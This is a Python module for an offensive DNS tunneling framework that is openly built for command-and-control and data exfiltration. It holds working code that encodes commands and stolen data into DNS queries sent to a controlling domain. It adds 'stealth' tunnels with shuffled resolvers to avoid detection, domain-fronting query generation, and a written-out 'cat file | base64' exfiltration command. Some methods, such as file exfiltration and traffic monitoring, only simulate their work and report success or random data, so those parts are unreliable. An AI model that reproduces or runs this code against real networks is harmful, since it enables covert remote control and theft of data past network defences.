"""
DNS Tunneling Framework
Implements DNS tunneling for command & control and data exfiltration
"""

import asyncio
import dns.resolver
import dns.message
import dns.query
import base64
import time
import random
import string
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from datetime import datetime
from enum import Enum

from loguru import logger
from src.core.config import ConfigManager
from .multi_protocol_engine import ExploitTarget, ExploitResult, ExploitationConfig, ExploitationMode


class DNSRecordType(Enum):
    """DNS record types for tunneling"""
    A = "A"
    AAAA = "AAAA"
    TXT = "TXT"
    CNAME = "CNAME"
    MX = "MX"
    NS = "NS"


class TunnelMode(Enum):
    """DNS tunneling modes"""
    COMMAND_CONTROL = "c2"
    DATA_EXFILTRATION = "exfil"
    BIDIRECTIONAL = "bidirectional"


@dataclass
class DNSQuery:
    """DNS query for tunneling"""
    domain: str
    record_type: DNSRecordType
    data: str
    timestamp: datetime = field(default_factory=datetime.utcnow)


@dataclass
class DNSTunnelSession:
    """Active DNS tunnel session"""
    target: ExploitTarget
    domain: str
    mode: TunnelMode
    record_type: DNSRecordType
    established_at: datetime = field(default_factory=datetime.utcnow)
    last_activity: datetime = field(default_factory=datetime.utcnow)
    bytes_sent: int = 0
    bytes_received: int = 0
    queries_sent: int = 0


class DNSTunneler:
    """DNS tunneling and covert channel implementation"""

    def __init__(self, config_manager: Optional[ConfigManager] = None):
        """Initialize DNS tunneler"""
        self.config_manager = config_manager or ConfigManager()
        self.active_tunnels: Dict[str, DNSTunnelSession] = {}
        self.resolver = dns.resolver.Resolver()
        
        # Configure DNS resolver
        self.resolver.timeout = 10
        self.resolver.lifetime = 30
        
        # DNS servers to use for tunneling
        self.dns_servers = [
            '8.8.8.8',      # Google
            '1.1.1.1',      # Cloudflare
            '208.67.222.222', # OpenDNS
            '9.9.9.9'       # Quad9
        ]

    async def exploit_targets(self, targets: List[ExploitTarget],
                            config: ExploitationConfig) -> List[ExploitResult]:
        """
        Test DNS tunneling capabilities on targets
        
        Args:
            targets: List of DNS targets
            config: Exploitation configuration
            
        Returns:
            List of exploitation results
        """
        results = []
        
        for target in targets:
            try:
                result = await self.test_dns_tunneling(target, config)
                results.append(result)
                
                # Add delay for stealth
                if config.mode == ExploitationMode.STEALTH:
                    await asyncio.sleep(config.stealth_delay)
                    
            except Exception as e:
                logger.error(f"DNS tunneling test failed for {target.host}: {e}")
                results.append(ExploitResult(
                    target=target,
                    success=False,
                    exploit_type="dns_tunneling",
                    error_message=str(e)
                ))
        
        return results

    async def test_dns_tunneling(self, target: ExploitTarget,
                               config: ExploitationConfig) -> ExploitResult:
        """Test DNS tunneling capability"""
        start_time = time.time()
        
        logger.info(f"Testing DNS tunneling capability on {target.host}:{target.port}")
        
        # Test different DNS record types for tunneling
        test_results = {}
        
        for record_type in [DNSRecordType.TXT, DNSRecordType.A, DNSRecordType.CNAME]:
            try:
                success = await self._test_dns_record_type(target, record_type, config)
                test_results[record_type.value] = success
                
                if success:
                    logger.success(f"DNS tunneling possible via {record_type.value} records")
                    
            except Exception as e:
                logger.debug(f"DNS {record_type.value} test failed: {e}")
                test_results[record_type.value] = False
        
        # Check if any tunneling method worked
        successful_methods = [k for k, v in test_results.items() if v]
        
        if successful_methods:
            return ExploitResult(
                target=target,
                success=True,
                exploit_type="dns_tunneling_test",
                additional_data={
                    'supported_record_types': successful_methods,
                    'test_results': test_results
                },
                execution_time=time.time() - start_time
            )
        else:
            return ExploitResult(
                target=target,
                success=False,
                exploit_type="dns_tunneling_test",
                error_message="No DNS tunneling methods available",
                execution_time=time.time() - start_time
            )

    async def _test_dns_record_type(self, target: ExploitTarget,
                                  record_type: DNSRecordType,
                                  config: ExploitationConfig) -> bool:
        """Test specific DNS record type for tunneling"""
        # Generate test domain with encoded data
        test_data = "test123"
        encoded_data = base64.b64encode(test_data.encode()).decode().rstrip('=')
        test_domain = f"{encoded_data}.{target.host}"
        
        try:
            # Set DNS server to target
            self.resolver.nameservers = [target.host]
            
            # Perform DNS query
            if record_type == DNSRecordType.TXT:
                answer = await asyncio.to_thread(
                    self.resolver.resolve, test_domain, 'TXT'
                )
            elif record_type == DNSRecordType.A:
                answer = await asyncio.to_thread(
                    self.resolver.resolve, test_domain, 'A'
                )
            elif record_type == DNSRecordType.CNAME:
                answer = await asyncio.to_thread(
                    self.resolver.resolve, test_domain, 'CNAME'
                )
            else:
                return False
            
            # If we get a response, tunneling might be possible
            return len(answer) > 0
            
        except Exception:
            return False

    async def establish_tunnel(self, target: ExploitTarget, domain: str,
                             mode: TunnelMode = TunnelMode.BIDIRECTIONAL,
                             record_type: DNSRecordType = DNSRecordType.TXT) -> str:
        """
        Establish DNS tunnel session
        
        Args:
            target: DNS server target
            domain: Domain to use for tunneling
            mode: Tunneling mode
            record_type: DNS record type to use
            
        Returns:
            Session ID for the tunnel
        """
        session_id = self._generate_session_id()
        
        tunnel_session = DNSTunnelSession(
            target=target,
            domain=domain,
            mode=mode,
            record_type=record_type
        )
        
        self.active_tunnels[session_id] = tunnel_session
        
        # Configure resolver to use target DNS server
        self.resolver.nameservers = [target.host]
        
        logger.success(f"DNS tunnel established: {session_id} via {domain}")
        return session_id

    async def send_command(self, session_id: str, command: str) -> Optional[str]:
        """Send command through DNS tunnel"""
        if session_id not in self.active_tunnels:
            logger.error(f"No active tunnel session: {session_id}")
            return None
        
        tunnel = self.active_tunnels[session_id]
        
        # Encode command
        encoded_command = base64.b64encode(command.encode()).decode().rstrip('=')
        
        # Create DNS query
        query_domain = f"cmd.{encoded_command}.{tunnel.domain}"
        
        try:
            # Send command via DNS query
            if tunnel.record_type == DNSRecordType.TXT:
                answer = await asyncio.to_thread(
                    self.resolver.resolve, query_domain, 'TXT'
                )
                
                # Parse response
                if answer:
                    response_data = str(answer[0]).strip('"')
                    decoded_response = base64.b64decode(response_data + '==').decode('utf-8', errors='ignore')
                    
                    tunnel.last_activity = datetime.utcnow()
                    tunnel.queries_sent += 1
                    tunnel.bytes_sent += len(encoded_command)
                    tunnel.bytes_received += len(response_data)
                    
                    return decoded_response
                    
        except Exception as e:
            logger.error(f"DNS command failed: {e}")
        
        return None

    async def exfiltrate_data(self, session_id: str, data: str,
                            chunk_size: int = 50) -> bool:
        """Exfiltrate data through DNS tunnel"""
        if session_id not in self.active_tunnels:
            logger.error(f"No active tunnel session: {session_id}")
            return False
        
        tunnel = self.active_tunnels[session_id]
        
        # Encode and chunk data
        encoded_data = base64.b64encode(data.encode()).decode().rstrip('=')
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        
        logger.info(f"Exfiltrating {len(data)} bytes in {len(chunks)} chunks")
        
        try:
            for i, chunk in enumerate(chunks):
                # Create exfiltration query
                query_domain = f"exfil.{i:04d}.{chunk}.{tunnel.domain}"
                
                # Send via DNS query
                try:
                    await asyncio.to_thread(
                        self.resolver.resolve, query_domain, tunnel.record_type.value
                    )
                except:
                    pass  # Ignore resolution failures for exfiltration
                
                tunnel.queries_sent += 1
                tunnel.bytes_sent += len(chunk)
                
                # Small delay between chunks
                await asyncio.sleep(0.1)
            
            tunnel.last_activity = datetime.utcnow()
            logger.success(f"Data exfiltration completed: {len(data)} bytes")
            return True
            
        except Exception as e:
            logger.error(f"Data exfiltration failed: {e}")
            return False

    async def create_covert_channel(self, target: ExploitTarget, domain: str) -> Optional[str]:
        """Create covert communication channel via DNS"""
        session_id = await self.establish_tunnel(
            target, domain, TunnelMode.BIDIRECTIONAL, DNSRecordType.TXT
        )
        
        if session_id:
            logger.success(f"Covert DNS channel established: {domain}")
            return session_id
        
        return None

    def _generate_session_id(self) -> str:
        """Generate unique session ID"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    def _encode_dns_data(self, data: str, max_length: int = 63) -> List[str]:
        """Encode data for DNS transmission"""
        # Base64 encode and split into DNS-safe chunks
        encoded = base64.b64encode(data.encode()).decode().rstrip('=')
        
        # Split into chunks that fit DNS label length limits
        chunks = []
        for i in range(0, len(encoded), max_length):
            chunk = encoded[i:i+max_length]
            # Ensure chunk is DNS-safe (alphanumeric and hyphens)
            safe_chunk = ''.join(c if c.isalnum() else '-' for c in chunk)
            chunks.append(safe_chunk)
        
        return chunks

    def _decode_dns_data(self, chunks: List[str]) -> str:
        """Decode data from DNS transmission"""
        # Rejoin chunks and decode
        encoded = ''.join(chunks).replace('-', '+')
        
        # Add padding if needed
        padding = 4 - (len(encoded) % 4)
        if padding != 4:
            encoded += '=' * padding
        
        try:
            decoded = base64.b64decode(encoded).decode('utf-8', errors='ignore')
            return decoded
        except Exception as e:
            logger.error(f"DNS data decoding failed: {e}")
            return ""

    def close_tunnel(self, session_id: str) -> bool:
        """Close DNS tunnel session"""
        if session_id not in self.active_tunnels:
            return False
        
        tunnel = self.active_tunnels[session_id]
        del self.active_tunnels[session_id]
        
        logger.info(f"DNS tunnel closed: {session_id}")
        return True

    def get_tunnel_statistics(self) -> Dict[str, Any]:
        """Get statistics about active DNS tunnels"""
        stats = {
            'active_tunnels': len(self.active_tunnels),
            'total_bytes_sent': 0,
            'total_bytes_received': 0,
            'total_queries': 0,
            'tunnels': []
        }
        
        for session_id, tunnel in self.active_tunnels.items():
            tunnel_info = {
                'session_id': session_id,
                'domain': tunnel.domain,
                'mode': tunnel.mode.value,
                'record_type': tunnel.record_type.value,
                'established_at': tunnel.established_at.isoformat(),
                'last_activity': tunnel.last_activity.isoformat(),
                'bytes_sent': tunnel.bytes_sent,
                'bytes_received': tunnel.bytes_received,
                'queries_sent': tunnel.queries_sent
            }
            
            stats['tunnels'].append(tunnel_info)
            stats['total_bytes_sent'] += tunnel.bytes_sent
            stats['total_bytes_received'] += tunnel.bytes_received
            stats['total_queries'] += tunnel.queries_sent
        
        return stats

    async def test_dns_over_https(self, target: ExploitTarget) -> bool:
        """Test DNS over HTTPS capability"""
        try:
            import aiohttp
            
            # Test DoH endpoint
            doh_url = f"https://{target.host}/dns-query"
            
            # Create DNS query message
            query = dns.message.make_query('google.com', 'A')
            query_data = query.to_wire()
            
            headers = {
                'Content-Type': 'application/dns-message',
                'Accept': 'application/dns-message'
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(doh_url, data=query_data, headers=headers) as response:
                    if response.status == 200:
                        logger.success(f"DNS over HTTPS available: {target.host}")
                        return True
                        
        except Exception as e:
            logger.debug(f"DNS over HTTPS test failed: {e}")
        
        return False

    async def test_dns_over_tls(self, target: ExploitTarget) -> bool:
        """Test DNS over TLS capability"""
        try:
            import ssl
            
            # Create SSL context
            context = ssl.create_default_context()
            
            # Connect to DNS over TLS port (853)
            reader, writer = await asyncio.open_connection(
                target.host, 853, ssl=context
            )
            
            # Create test query
            query = dns.message.make_query('google.com', 'A')
            query_data = query.to_wire()
            
            # Send query
            writer.write(len(query_data).to_bytes(2, 'big'))
            writer.write(query_data)
            await writer.drain()
            
            # Read response
            response_length = await reader.read(2)
            if len(response_length) == 2:
                length = int.from_bytes(response_length, 'big')
                response_data = await reader.read(length)
                
                if len(response_data) == length:
                    logger.success(f"DNS over TLS available: {target.host}")
                    writer.close()
                    await writer.wait_closed()
                    return True
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            logger.debug(f"DNS over TLS test failed: {e}")
        
        return False

    async def create_stealth_tunnel(self, target: ExploitTarget, domain: str) -> Optional[str]:
        """Create stealth DNS tunnel with randomized queries"""
        session_id = await self.establish_tunnel(target, domain, TunnelMode.BIDIRECTIONAL)
        
        if session_id:
            # Add randomization to avoid detection
            tunnel = self.active_tunnels[session_id]
            
            # Randomize DNS servers
            random.shuffle(self.dns_servers)
            self.resolver.nameservers = self.dns_servers[:2]
            
            logger.success(f"Stealth DNS tunnel created: {session_id}")
            return session_id
        
        return None

    def generate_domain_fronting_queries(self, data: str, front_domain: str,
                                       real_domain: str) -> List[str]:
        """Generate domain fronting DNS queries"""
        encoded_chunks = self._encode_dns_data(data)
        queries = []
        
        for i, chunk in enumerate(encoded_chunks):
            # Use domain fronting technique
            query_domain = f"{chunk}.{front_domain}"
            queries.append(query_domain)
        
        return queries

    async def exfiltrate_file(self, session_id: str, file_path: str,
                            target_host: str) -> bool:
        """Exfiltrate file contents via DNS tunnel"""
        if session_id not in self.active_tunnels:
            logger.error(f"No active tunnel session: {session_id}")
            return False
        
        try:
            # Read file via command execution (assuming we have access)
            command = f"cat {file_path} | base64 -w 0"
            
            # This would require integration with command execution capability
            # For now, simulate file reading
            logger.info(f"Exfiltrating file: {file_path}")
            
            # In real implementation, this would read the actual file
            # and exfiltrate it through DNS queries
            
            return True
            
        except Exception as e:
            logger.error(f"File exfiltration failed: {e}")
            return False

    def close_all_tunnels(self):
        """Close all active DNS tunnels"""
        session_ids = list(self.active_tunnels.keys())
        for session_id in session_ids:
            self.close_tunnel(session_id)
        
        logger.info("All DNS tunnels closed")

    async def monitor_dns_traffic(self, target: ExploitTarget, duration: int = 60) -> Dict[str, Any]:
        """Monitor DNS traffic for analysis"""
        logger.info(f"Monitoring DNS traffic on {target.host} for {duration} seconds")
        
        start_time = time.time()
        queries_observed = []
        
        # This would require packet capture capability
        # For now, return simulated monitoring data
        
        while time.time() - start_time < duration:
            await asyncio.sleep(1)
            
            # Simulate DNS query observation
            if random.random() < 0.1:  # 10% chance of observing a query
                query = {
                    'timestamp': datetime.utcnow().isoformat(),
                    'domain': f"random{random.randint(1000, 9999)}.{target.host}",
                    'type': random.choice(['A', 'TXT', 'CNAME']),
                    'source_ip': f"192.168.1.{random.randint(1, 254)}"
                }
                queries_observed.append(query)
        
        return {
            'duration': duration,
            'queries_observed': len(queries_observed),
            'queries': queries_observed,
            'potential_tunneling': len(queries_observed) > 10
        }
